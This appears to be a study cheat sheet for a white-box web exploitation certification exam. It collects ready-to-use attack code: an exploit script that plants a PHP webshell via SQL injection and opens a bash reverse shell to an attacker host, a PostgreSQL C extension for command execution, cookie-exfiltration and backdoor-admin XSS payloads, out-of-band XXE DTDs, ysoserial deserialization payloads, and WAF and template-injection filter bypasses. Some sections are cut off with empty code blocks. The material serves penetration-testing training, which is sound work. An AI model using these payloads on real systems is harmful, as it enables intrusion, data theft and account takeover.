  • White-box exam — you receive the application source code and must produce a working automated exploit
  • Toolchain: Burp Suite Pro for traffic inspection, Python for scripted exploitation, per-language IDE/debugger, decompilers for closed binaries

1.2 Exploit Script Skeleton

  • Every exploit follows the same shape: a Session, one function per stage (auth bypass → primitive → RCE trigger), arguments at the top, and a main that runs them in order
#!/usr/bin/env python3
"""Exploit - target: <app>  chain: SQLi auth bypass -> RCE"""
import requests, sys, re, argparse

TARGET  = "http://192.168.X.Y"
LHOST   = "10.10.10.10"
LPORT   = 443

s = requests.Session()
s.verify = False   # self-signed certs on exam targets

# Step 1 - Auth bypass / get session
def login_bypass():
    r = s.post(f"{TARGET}/login", data={"user": "admin'--", "pass": "x"})
    assert "dashboard" in r.text, "login bypass failed"
    print("[+] authenticated")

# Step 2 - SQLi to read/write a file / call a stored proc
def sqli_write_webshell():
    payload = "'; COPY (SELECT '<?php system($_GET[\"c\"]);?>') TO '/var/www/html/s.php';--"
    r = s.post(f"{TARGET}/api/search", json={"q": payload})
    assert r.status_code != 500, "SQLi failed"
    print("[+] webshell dropped")

# Step 3 - Execute reverse shell
def trigger_rce():
    cmd = f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
    r = s.get(f"{TARGET}/s.php", params={"c": cmd})
    print("[+] reverse shell triggered")

if __name__ == "__main__":
    login_bypass()
    sqli_write_webshell()
    trigger_rce()

  • Java JAR/WAR/class files: jd-gui for browsing, CFR/Procyon for batch decompilation

2. Source Code Review Methodology

  • Start at entry points (routes/controllers that accept input) and follow tainted data downstream
  • Any user input reaching a dangerous sink without sanitization is a vulnerability

2.1 Review Approach

  • Map the attack surface first: enumerate every route, controller, and API endpoint
  • Note which require auth and which don’t
  • Focus on pre-auth entry points — login, password reset, registration, public APIs, static handlers
  • Trace tainted parameters into queries, deserializers, eval, file ops, and template engines
  • Typical exam-winning chain: pre-auth SQLi → file write, pre-auth SSRF → URL fetch, or stored XSS → admin token steal → authenticated RCE

2.2 HTTP Routing Patterns

  • Find every endpoint before reading any sinks
  • Each framework expresses routes differently — know the patterns and grep accordingly

Django (Python)urls.py — path(), re_path() entries
Express (Node.js)app.get/post/put/delete("/path", handler) / router.use(…)
Spring (Java)@RequestMapping, @GetMapping, @PostMapping on controllers
JAX-RS / Servlet (Java)@Path annotations; web.xml <servlet-mapping>
ASP.NET MVC / Core[Route("…")], [HttpGet/Post] attributes; MapRoute in startup

  • Grep for the sinks, then back-trace which user-controlled inputs reach them

2.4 Manual Taint Tracking

  • For each sink, work backward: which function calls reach it, which parameter carries attacker data, what sanitization runs along the way
  • Semgrep automates the source-to-sink trace for common languages

# Find places where user-controlled data is echoed without escaping (XSS)

semgrep --config p/nodejs-security .

3. Authentication Bypass

  • First move in almost every white-box chain
  • Comes from logic flaws, type confusion, JWT weaknesses, or injection in the login/reset path

3.1 SQL Injection Auth Bypass

  • When a login query is string-concatenated, inject a comment that makes the WHERE clause always true or inject a valid second user
  • White-box advantage: read the exact query and craft the precise payload
-- Classic (MySQL, MSSQL, SQLite, PostgreSQL)
username: admin'--
username: admin'#           -- MySQL comment variant
username: ' OR '1'='1       -- if the query wraps value in quotes
username: ' OR 1=1--
password field only: ' OR 1=1--

-- Second-user injection (terminate the username string, comment-eat the password check)
username: validuser'/*
password: */OR'1'='1

-- Bypass hash comparison (SQLi in password field when hash is compared in PHP)
password: ' OR password LIKE '%

3.2 Type Confusion & PHP Loose Comparisons

  • PHP == compares "0e12345..." against "0e99999..." as floats and finds them equal — the “magic hash” trick
  • JSON deserialization can slip an integer where a string is expected, which loose comparison treats as equal
// Vulnerable: if ($hash == $input_hash)
// PHP ==  compares "0e12345..." == "0e99999..." as floats -> TRUE
// Submit any value whose MD5/SHA1 starts with "0e" followed only by digits.
// Known magic hashes: MD5("240610708") = "0e462097431906509019562988736854"

// Type juggling via JSON
// POST body: {"user": 0, "pass": "anything"}  -> PHP 0 == "admin" is TRUE (loose ==)
// Fix uses === or password_verify(); white-box you see which.

3.3 JWT Attacks

  • Decode every JWT first — the header reveals the algorithm
  • Try algorithm confusion (RS256→HS256 with the public key as HMAC secret), alg: none attack, brute-force HS256 secret
# Decode a JWT (no verification)
jwt_tool "eyJ..." -d

# Algorithm confusion: change "RS256" to "HS256", sign with the RSA public key as HMAC secret
jwt_tool "eyJ..." -X a -pk public.pem

# "alg: none" attack: strip the signature and set alg to none
jwt_tool "eyJ..." -X n

# Brute-force weak HS256 secret
jwt_tool "eyJ..." -C -d /usr/share/wordlists/rockyou.txt

# Forge a new payload once secret or key confusion is found
jwt_tool "eyJ..." -T    # interactive tamper mode

3.4 Password Reset Logic Flaws

  • Reset flow is a common pre-auth path to admin
  • Look for: predictable tokens (timestamp/sequence-derived), missing invalidation after use, host-header injection, HTTP parameter pollution, timing-based account enumeration
# openCRX-style: token derived from a seeded PRNG using the current timestamp.
# Step 1: request a reset for a known account and capture the reset timestamp.
# Step 2: predict the PRNG state for a window of seeds around that timestamp.
# Step 3: generate every candidate token and try them against the reset endpoint.

import random, time, requests
TARGET = "http://target/reset"
now = int(time.time())
for seed in range(now - 5, now + 5):
    random.seed(seed)
    token = "".join(random.choice("0123456789abcdef") for _ in range(32))
    r = requests.get(f"{TARGET}?token={token}", allow_redirects=False)
    if r.status_code == 200:
        print(f"[+] token: {token}")
        break

# Host header injection: change Host to your server; user clicks the emailed link
# -> their browser sends the token to your server.
# Burp: tamper Host: attacker.com on the /forgot-password request.
# Parameter pollution: email=victim@corp.com&email=attacker@evil.com
# Some frameworks pick the first for the mail recipient, the last for the reset DB write.

4. SQL Injection → RCE

  • ManageEngine and ERPNext chapters both go from SQLi to RCE
  • Dominant techniques: file writes (INTO OUTFILE, COPY TO, large objects), stored procedures (xp_cmdshell), PostgreSQL extensions / UDFs

4.1 Enumeration & Fingerprinting

  • First injection always identifies the DBMS — error messages, comment syntax, and version functions
  • White-box: you know from the source; confirm at runtime anyway
-- Database fingerprint via version
SELECT @@version             -- MySQL / MSSQL
SELECT version()             -- PostgreSQL
SELECT banner FROM v$version -- Oracle

-- Error-based (MySQL): force a type conversion error that leaks data
SELECT extractvalue(1,concat(0x7e,(SELECT version())))
-- MSSQL: CONVERT error
SELECT CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))

4.2 File Read / Write via SQLi

  • Each DBMS exposes its own file-write primitive
  • MySQL: INTO OUTFILE; PostgreSQL: COPY ... TO and large objects; MSSQL: xp_cmdshell
  • Targets often disable the obvious path — have the fallback ready
-- MySQL: read a file (FILE privilege required)
SELECT LOAD_FILE('/etc/passwd')
-- MySQL: write a webshell (secure_file_priv must be unset or point to web root)
SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/shell.php'
SELECT '<?php system($_GET["c"]);?>' INTO DUMPFILE '/var/www/html/shell.php'

-- PostgreSQL: write via COPY (the ManageEngine course chain)
COPY (SELECT '<?php system($_GET["c"]);?>') TO '/var/www/html/shell.php'
-- PostgreSQL: large object (lo_export) for arbitrary binary write
SELECT lo_from_bytea(0, '\\x3c3f706870...') -- hex-encoded payload
SELECT lo_export(oid, '/var/www/html/shell.php') FROM pg_largeobject_metadata WHERE ...

-- MSSQL: xp_cmdshell (if enabled or if you can enable it)
EXEC master..xp_cmdshell 'powershell -enc ...'
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

4.3 PostgreSQL UDF / Extension RCE

  • When file write is blocked but you have superuser, build a malicious C extension with system()
  • ManageEngine chapter walks this end-to-end: compile to .so, host on your server, load remotely, call the function
// rce_ext.c - PostgreSQL extension that runs an OS command
#include "postgres.h"
#include "fmgr.h"
#include <stdlib.h>
PG_MODULE_MAGIC;
PG_FUNCTION_INFO_V1(rce);
Datum rce(PG_FUNCTION_ARGS) {
    char *cmd = text_to_cstring(PG_GETARG_TEXT_PP(0));
    system(cmd);
    PG_RETURN_VOID();
}
# Build for the target PG version
gcc -I"$(pg_config --includedir-server)" -fPIC -shared rce_ext.c -o rce_ext.so
# Host on attacker
python3 -m http.server 80
-- Load it via SQLi (PostgreSQL >= 9.1)
CREATE FUNCTION rce(text) RETURNS void AS '/tmp/rce_ext.so', 'rce' LANGUAGE C STRICT;
SELECT rce('bash -c "bash -i >& /dev/tcp/10.10.10.10/443 0>&1"');

-- Or PL/pgSQL function calling COPY TO PROGRAM (PG >= 9.3)
CREATE OR REPLACE FUNCTION exec(cmd TEXT) RETURNS void AS $$
BEGIN EXECUTE 'COPY (SELECT '''') TO PROGRAM ' || quote_literal(cmd); END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT exec('bash -c "bash -i >& /dev/tcp/10.10.10.10/443 0>&1"');

4.4 Stacked Queries & Stored Procedures

  • When the driver allows stacked queries (mysqli_multi_query, PDO with PG/MSSQL), append a second statement
  • Can create a function, enable a config, or directly execute a command via database built-ins
-- MySQL stacked queries (mysqli_multi_query or some PDO configs)
'; DROP TABLE users;--
'; INSERT INTO admins(user,pass) VALUES('hax','hax');--

-- MSSQL: enable xp_cmdshell via stacked queries
'; EXEC sp_configure ''show advanced options'',1;RECONFIGURE;
   EXEC sp_configure ''xp_cmdshell'',1;RECONFIGURE;
   EXEC xp_cmdshell ''whoami'';--

4.5 Blind / Time-Based SQLi

  • When you can’t see query results, automate character-by-character extraction with a time-based oracle
  • Sleep functions: MySQL SLEEP, PostgreSQL pg_sleep, MSSQL WAITFOR DELAY
import requests, string, time

TARGET = "http://10.10.10.10/search"
CHARS  = string.printable
secret = ""

for pos in range(1, 50):
    for c in CHARS:
        # MySQL time-based: if the char matches, sleep 2 seconds
        payload = f"' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1)='{c}',SLEEP(2),0)--"
        t0 = time.time()
        requests.get(TARGET, params={"q": payload})
        if time.time() - t0 > 1.5:
            secret += c
            print(f"\r[+] {secret}", end="", flush=True)
            break
print()
# For PostgreSQL: pg_sleep(2); for MSSQL: WAITFOR DELAY '0:0:2'

5. Cross-Site Scripting → Account Takeover

  • Stored or DOM-based XSS is used to fetch the admin’s CSRF token, create a backdoor account, or trigger an authenticated RCE endpoint
  • The chains here rarely care about alert(1)

5.1 Finding & Confirming XSS

  • Send a canary and grep the response for it unescaped
  • Different contexts demand different breakouts: closing a quoted attribute, escaping a <script> block, hopping out of a JS string literal
  • A polyglot probes several contexts at once
# Basic reflection canary - look for it unescaped in the response
curl -s "http://target/search?q=xsscanary123" | grep xsscanary123

# Context probing: if inside an attribute, inject closing quote then event handler
# value="USER_INPUT" --> value="" onfocus="alert(1)" autofocus="
# Inside a <script> block: USER_INPUT --> ";alert(1)//

# Polyglot to probe multiple contexts at once
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//

5.2 DOM-Based XSS

  • DOM XSS lives entirely in client-side JavaScript — server never sees the payload
  • Sources: location.hash, location.search, document.referrer, window.name
  • Sinks: innerHTML, document.write, eval, setTimeout(string)
  • openITCOCKPIT chapter chains a DOM XSS through a websocket client
// Vulnerable DOM pattern (sink: innerHTML; source: location.hash)
document.getElementById("greeting").innerHTML = location.hash.slice(1);
// Payload: http://target/page#<img src=x onerror=alert(1)>

// Common DOM sinks (grep for them in the bundled JS)
innerHTML, outerHTML, insertAdjacentHTML, document.write, document.writeln,
eval, Function, setTimeout("...", N), setInterval("...", N),
location, location.href, location.assign, location.replace

5.3 Session Cookie / Token Exfiltration

  • If cookies lack HttpOnly, classic exfil works
  • Otherwise pivot — read the CSRF token from a page reachable with the victim’s session and chain into a state-changing request
// Classic cookie exfil (HttpOnly=false required)
<script>fetch("http://LHOST/x?c="+document.cookie)</script>
<img src=x onerror="this.src='http://LHOST/?c='+document.cookie">

// Fetch API - works across modern browsers, handles redirects
<script>fetch("http://LHOST/?c="+btoa(document.cookie))</script>

5.4 XSS to CSRF Chain (Admin Action)

  • Read the admin’s page (carries their cookies via credentials:"include"), extract CSRF token, POST a privileged action
// Steal CSRF token from admin's page, then POST a state-changing request
fetch("/admin/settings", {credentials:"include"})
  .then(r => r.text())
  .then(html => {
    const token = html.match(/csrf[_-]token.*?value="([^"]+)"/i)[1];
    return fetch("/admin/adduser", {
      method:"POST",
      credentials:"include",
      headers:{"Content-Type":"application/x-www-form-urlencoded"},
      body:`csrf=${token}&user=hax&pass=hax&role=admin`
    });
  })

5.5 Stored XSS → Persistent Admin Backdoor

  • Find a field stored and later rendered to an admin (support tickets, profiles, comments, filenames). The payload waits for the admin’s browser to render it, then creates a new admin account or fetches an authenticated RCE endpoint.
// Stored XSS that creates a backdoor admin via a fetch chain
<script>
var t;
fetch("/admin/users/new", {credentials:"include"})
  .then(r => r.text())
  .then(h => {
    t = h.match(/name="csrf" value="([^"]+)"/)[1];
    return fetch("/admin/users/new",{
      method:"POST",credentials:"include",
      headers:{"Content-Type":"application/x-www-form-urlencoded"},
      body:"csrf=" + t + "&username=backdoor&password=pwned1!&role=Administrator"
    });

</script>

5.6 Persisting XSS Loot via IndexedDB / WebSockets

  • The openITCOCKPIT advanced-XSS chapter persists scraped admin data into the victim’s browser IndexedDB and exfiltrates it back over a websocket. Useful when you need to capture data across page loads, or when the admin’s page navigates away before exfil completes.
// Open / create a database, store loot, then exfiltrate later
const req = indexedDB.open("loot", 1);
req.onupgradeneeded = e => e.target.result.createObjectStore("d", {autoIncrement: true});
req.onsuccess = e => {
  const tx = e.target.result.transaction("d", "readwrite");
  tx.objectStore("d").add({ url: location.href, body: document.body.innerHTML });
};

// Later: read it back and stream over a WebSocket to the attacker
const ws = new WebSocket("ws://LHOST/loot");
ws.onopen = () => {
  const tx = db.transaction("d", "readonly");
  tx.objectStore("d").openCursor().onsuccess = e => {
    const c = e.target.result;
    if (c) { ws.send(JSON.stringify(c.value)); c.continue(); }
  };
};

6. CSRF, CORS & SameSite Bypass

  • A canonical chain here combines CSRF + permissive CORS into a pre-auth account takeover. The pieces — Same-Origin Policy, CORS, and SameSite cookies — need to be reasoned about together.

6.1 Same-Origin Policy (SOP)

  • SOP prevents scripts on origin A from reading responses from origin B. “Origin” = scheme + host + port. SOP does not block requests being sent (CSRF still works); it blocks reading the response. Anything that bypasses or relaxes SOP — CORS misconfig, postMessage misuse, JSONP — can flip a CSRF into a full read-and-write attack.

6.2 CORS Misconfiguration

  • The server can opt to allow cross-origin reads via Access-Control-Allow-Origin. Misconfigurations to look for: reflecting the request Origin verbatim, allowing null, allowing subdomain wildcards (a compromised subdomain abuses the parent), and shipping Access-Control-Allow-Credentials: true alongside a permissive origin (allows reading the response with cookies).
# Probe for an origin-reflecting CORS policy
curl -i -H "Origin: http://evil.com" http://target/api/profile
# If the response includes:
#   Access-Control-Allow-Origin: http://evil.com
#   Access-Control-Allow-Credentials: true
# any attacker page can read /api/profile with the victim's cookies attached.

# Other misconfigs to test
curl -i -H "Origin: null" http://target/api/profile   # sandboxed iframes / data: URIs
curl -i -H "Origin: http://target.evil.com" http://target/api/profile  # subdomain wildcard

6.3 SameSite Cookies

  • SameSite controls whether cookies travel cross-site. Strict strips them on any cross-site request; Lax sends them on top-level GET navigations only; None always sends them (requires Secure). On modern browsers cookies default to Lax — so a classic POST CSRF doesn’t carry the session cookie. Bypasses: top-level GET navigations still send Lax cookies; brand-new cookies (< 2 minutes old) bypass Lax in Chrome (the “Lax+POST” mitigation); cross-site requests from a same-site subdomain carry cookies normally.

6.4 Classic CSRF Exploitation

  • Auto-submit a form from the attacker page; the victim’s browser attaches their cookies (subject to SameSite). For JSON endpoints, build the form to encode as JSON or use fetch + a CORS-friendly content type. Pair with a permissive CORS policy to read the response.
<!-- Classic auto-submitting form CSRF (works without CSRF token validation) -->
<html><body onload="f.submit()">
  <form id=f action="http://target/admin/adduser" method=POST>
    <input name=user value=hax>
    <input name=pass value=hax>
    <input name=role value=Administrator>
  </form>
</body></html>

<!-- JSON CSRF: use a form with text/plain content type, body shaped like JSON -->
<form action="http://target/api/user" method=POST enctype="text/plain">
  <input name='{"user":"hax","pass":"hax","ignore":"' value='"}'>
</form>

6.5 CORS + CSRF Exploitation (Concord-Style)

  • Permissive CORS turns CSRF from “send-only” into a full read-and-write primitive: read the CSRF token from a page, then post with it. The Concord chapter exploits this against an unauthenticated endpoint plus an insecure default to take over the admin account.
// Hosted on attacker page. Victim visits while authenticated to target.
// 1. fetch reads the response thanks to permissive CORS
// 2. parse the CSRF token from the HTML
// 3. POST the privileged action with the matching token
fetch("http://target/admin", {credentials:"include"})
  .then(r => r.text())
  .then(h => {
    const t = /name="csrf" value="([^"]+)"/.exec(h)[1];
    return fetch("http://target/admin/users", {
      method: "POST", credentials: "include",
      headers: {"Content-Type":"application/x-www-form-urlencoded"},
      body: "csrf=" + t + "&user=hax&pass=Pwned1!&role=admin"
    });
  })
  .then(r => r.text())
  .then(t => fetch("http://LHOST/?d=" + btoa(t)));

7. Server-Side Template Injection (SSTI)

  • The ERPNext chapter chains a pre-auth SQLi to a Jinja2 SSTI. SSTI shows up wherever a template engine renders untrusted data — render functions, error pages that template the message, mailers that interpolate user input.

7.1 Detection

  • Probe with engine-distinguishing math. Different engines parse different specifier sets, so {{7*7}}, ${7*7}, #{7*7}, and <%= 7*7 %> together pinpoint Jinja2/Twig vs Freemarker/Thymeleaf vs Smarty vs ERB.
# Probe with math - different engines evaluate differently

8. XML External Entity (XXE)

  • The openCRX chapter uses XXE as the first primitive: an XML parser that resolves external entities lets you read local files, scan internal services, and (via parameter entities) achieve out-of-band exfiltration even when the response is blind.

8.1 XML Entities & Vulnerable Parsers

  • An XML parser that resolves DTDs is exploitable when attacker XML reaches it. Java’s default DocumentBuilderFactory, .NET’s XmlDocument pre-4.5.2, and many PHP libxml uses are insecure unless explicitly hardened. Look for SOAP endpoints, SAML responses, document parsers (DOCX/XLSX which are zipped XML), and image processors (SVG).
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- PHP-only: base64 wrapper to leak binary or PHP source -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php">]>
<foo>&xxe;</foo>

<!-- Internal port scan (timing oracle) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8500/v1/kv/?recurse">]>
<foo>&xxe;</foo>

8.2 Blind / OOB XXE with Parameter Entities

  • When the response doesn’t echo the entity, use parameter entities in an external DTD to assemble a URL containing the leaked data and force the parser to fetch it from your server — the file content lands in your HTTP log.
<!-- Step 1: send this payload to the target -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://LHOST/evil.dtd">
  %ext;
]>
<foo>1</foo>
<!-- Step 2: host this at http://LHOST/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://LHOST/?d=%file;'>">
%wrap;
%send;
<!-- The parser fetches evil.dtd, reads /etc/passwd into %file;,
     wraps it into a SYSTEM URL containing the data, then fetches that URL -->

8.3 CDATA Trick for Files Containing <, &, >

  • If the leaked file has XML metacharacters, the entity expansion will break parsing. Wrap the file content in CDATA via concatenated parameter entities — the openCRX chapter walks this trick.
<!-- evil.dtd that CDATA-wraps the leaked file -->
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///var/www/html/config.php">
<!ENTITY % end "]]>">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://LHOST/?d=%start;%file;%end;'>">
%wrap;
%send;

8.4 XXE → RCE Paths

  • Direct RCE from XXE is rare but possible. PHP with expect:// enabled gives a command primitive (rarely available). Java HSQLDB before 2.4.5 has a JDBC connection trick that executes Java code; the openCRX chapter chains XXE → HSQLDB → web shell via Java language routines.
<!-- PHP expect:// (rarely available) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>

9. Insecure Deserialization

  • The DotNetNuke chapter exploits .NET cookie deserialization end-to-end; the same patterns appear in Java, PHP, and Node.js. A deserializer that runs magic methods (or instantiates arbitrary classes) on attacker-controlled bytes is RCE when a gadget chain exists in the classpath.

9.1 Java Deserialization

  • ObjectInputStream.readObject() invokes deserialized objects’ readObject methods during construction. With CommonsCollections, Spring, Groovy, or similar libraries on the classpath, a crafted byte stream becomes command execution.
# Identify the vulnerability: "rO0AB" (base64) or 0xACED0005 (raw) - Java serialized magic bytes

curl -s http://target/api/endpoint | xxd | head -2   # look for aced 0005 or rO0AB

# Generate a payload with ysoserial

java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA...}|{base64,-d}|bash" > payload.ser

# Common gadget chains (try in order - depends on classpath):
# CommonsCollections1/3/5/6/7, Spring1/2, Groovy1, Jdk7u21, URLDNS

# Deliver as raw bytes, base64, or URL-encoded depending on transport:
curl -X POST http://target/endpoint --data-binary @payload.ser \
  -H "Content-Type: application/x-java-serialized-object"
B64=$(base64 -w0 payload.ser)
curl -X POST http://target/endpoint -d "data=$B64"

9.2 PHP Object Injection

  • PHP’s unserialize() reconstructs objects and triggers magic methods (__wakeup, __destruct, __toString) on them. If any loaded class has a dangerous magic method that uses its own properties, you control those properties — the chain ends in file write or command execution.

// Check autoloaded classes - any with __wakeup / __destruct using $this->file or $this->cmd?

    public $data    = "test";
    public function __destruct() { file_put_contents($this->logfile, $this->data); }

10. Server-Side Request Forgery (SSRF)

  • SSRF coverage here includes blind SSRF, internal port scanning, headless Chrome JS injection, and the Kong Admin API takeover. Anywhere a parameter takes a URL or hostname is a candidate.

10.1 Finding & Exploiting SSRF

  • Any URL-accepting parameter is a candidate: url, host, callback, fetch, webhook, redirect, imageurl, proxy, src. Common targets are cloud metadata (AWS IMDSv1 at 169.254.169.254), internal admin panels, Redis, Consul, and the Docker socket.
# Cloud metadata (AWS IMDSv1)
url=http://169.254.169.254/latest/meta-data/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Internal services
url=http://127.0.0.1:8080/admin
url=http://192.168.1.1:6379/                  # Redis
url=http://localhost:8500/v1/kv/              # Consul
url=http://127.0.0.1:2375/containers/json     # Docker API (unauth)

10.2 API Discovery via Verb Tampering

  • Microservices behind an SSRF often expose admin actions on undocumented verbs (PUT, DELETE, PATCH) gated only by a 405 check that doesn’t list real verbs. The course’s Directus chain enumerates endpoints by swapping the verb until a previously hidden response surfaces.
for V in GET POST PUT DELETE PATCH OPTIONS HEAD; do
  echo "[$V]"
  curl -s -o /dev/null -w "%{http_code} " -X $V http://target/api/admin/users
done

# An endpoint that returns 401 on GET and 200 on PUT is a verb-tampering signal.

10.3 SSRF Filter Bypass

  • Allowlists checking string prefixes are bypassed with IP-form obfuscation, DNS rebinding through services like nip.io, and authority-section confusion (@, #, encoded space).
# IP obfuscation

10.4 Blind SSRF Port Scanning

  • When the SSRF response is fully blind, time differences become the oracle: a port that returns RST is fast, a port that accepts and waits for protocol bytes is slow. Sweep a subnet from a single SSRF primitive.
import requests, time
def probe(host, port):
    t0 = time.time()
    try:
        requests.post(SSRF, json={"url": f"http://{host}:{port}"}, timeout=5)
    except requests.Timeout:
        return time.time() - t0
    return time.time() - t0

for ip in [f"10.0.0.{i}" for i in range(1, 255)]:
    for p in [22, 80, 443, 3306, 5432, 6379, 8500]:
        dt = probe(ip, p)
        if dt > 1.5:    # slow response -> likely open
            print(f"[+] {ip}:{p} - {dt:.1f}s")

11. Prototype Pollution (Node.js)

  • The Guacamole Lite chapter shows the modern Node.js exploitation primitive end-to-end: a recursive merge function lets attacker JSON pollute Object.prototype, and known template-engine gadgets turn that pollution into RCE.

11.1 Concept

  • JavaScript’s prototype chain means every object inherits from Object.prototype. If attacker input reaches obj[key] = value where key can be __proto__ or constructor.prototype, the attacker adds properties to every object in the process — including config defaults, template options, and middleware behavior.
// Vulnerable recursive merge
function merge(dst, src) {
  for (let k in src) { dst[k] = src[k]; }  // no prototype check!
}
// Attacker payload: {"__proto__": {"isAdmin": true}}
// After merge: ({}).isAdmin === true  (every object "is admin")

11.2 Finding & Discovering Pollution Sinks

  • Blackbox: post {"__proto__":{"polluted":true}} to JSON endpoints, then look for response headers, debug pages, or behaviors that reflect the polluted property. Whitebox: grep for unsafe recursive merge/extend/clone without a hasOwnProperty guard; check dependency versions for known-vulnerable lodash (< 4.17.12), jQuery (< 3.4), and minimist.
# Whitebox: hunt for unsafe deep merge / assign / recursive clone
grep -rn "merge\|assign\|extend\|clone\|deepCopy" src/ | grep -v "Object.assign"
# Look for: obj[key] = val without hasOwnProperty check, vulnerable lodash, jQuery, minimist

# Blackbox: pollute then probe
# POST {"__proto__":{"polluted":true}} to any JSON endpoint
# Then check: GET /health -> response headers or body may reflect properties

12. Command Injection & Eval/Filter Bypass

  • The Dolibarr chapter shows a real-world filter bypass against PHP eval(): a blocklist of dangerous keywords is defeated with reflection, alternate encodings, and string-construction tricks. The same patterns apply to eval in Python and Node.js.

12.1 PHP Command Injection & eval()

  • Dangerous PHP sinks: system(), exec(), passthru(), shell_exec(), popen(), proc_open(), backtick operator, and eval(). Inject metacharacters — ;, |, &, &&, $(...), backticks — or, for eval(), construct equivalent code that bypasses the filter.
// Sink pattern

// PHP disable_functions bypass via mail() (sendmail_path unhardened)

$fn = $_GET['fn']; $fn($cmd);  // call any function by name from a parameter
// Alternate encodings: system -> "system" via Unicode

12.2 Python eval / exec Injection

  • Raw eval() on user input is straight RCE. Sandboxed eval() (no builtins) can still escape via the class hierarchy — the same trick as Jinja2 SSTI.

# Sandbox escape: walk the MRO to subprocess.Popen

12.3 Node.js exec / spawn / Function()

  • Template-literal concatenation into a shell command is a CSI primitive. The Function constructor (and eval) compiles strings into code — never feed user input to either.

// Payload: ; id   OR  `id`   OR  $(id)

// Template literals in shell strings

  • When the app blocklists specific strings before calling eval, you defeat the blocklist by never spelling them out: reflection (call by reference, not by name), alternate encodings (Unicode escapes, hex), and string modifications (concatenation, slicing, base conversion). The Dolibarr chapter walks every form.

14. Web Application Firewall (WAF) Bypass

  • The RudderStack chapter exploits a SQL injection that’s protected by Coraza WAF. Modern WAFs match signatures and AST patterns, not raw substrings — you bypass them by varying syntax in ways the signature didn’t anticipate.

14.1 Reading the Ruleset (White-Box)

  • White-box: the WAF rules are in the source tree. Find them (coraza/conf, modsecurity/rules, .conf files with SecRule) and read them. Identify which patterns match what, then craft inputs that don’t match. Blackbox: send progressively benign payloads until one passes, then walk syntactically equivalent forms.

14.2 WAF Bypass for SQLi

  • Vary case, inject inline comments, swap whitespace for tabs/newlines/parentheses, double-encode, switch keywords for synonyms.
-- Case variation / mixed case
SeLeCt 1 FrOm InFoRmAtIoN_sCHeMa.TaBlEs

-- Comment insertion (MySQL allows comments inside keywords)
SE/**/LECT 1 FR/**/OM users
SELECT/*!32302 1*/FROM users

-- Whitespace alternatives
SELECT%09username%09FROM%09users   -- tab
SELECT%0aFROM users                -- newline
SELECT(1)FROM(users)               -- no spaces with parens

-- URL double-encoding
%2527  ->  decoded twice = '    (bypasses single-decode filters)
%252f  ->  /

-- Equivalent expressions
UNION SELECT 1,2,3  ->  UNION ALL SELECT 1,2,3
WHERE id=1          ->  WHERE id=0+1  or  WHERE id=1.0

-- Scientific notation / type tricks (MySQL)

  • Same idea, different syntax space: alternate event handlers, HTML-entity encoding, JS string escaping, template literals, and CSP holes via whitelisted CDNs that ship eval-able libraries.

14.4 WAF Bypass for SSTI

  • Same arsenal: hex-encode attribute names, build keywords from concatenation, switch from . to |attr(), switch from [] to getattr().
# Bypass "." filter in Jinja2
request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')
# Bypass underscore filter
__class__ -> request|attr(['_'*2+'class'+'_'*2])
# Bypass [] and .
getattr(target, 'attr')  via |attr() filter
# String concatenation
['__cl'+'ass__']
# Hex-encode attribute names
request|attr('\x5f\x5fclass\x5f\x5f')
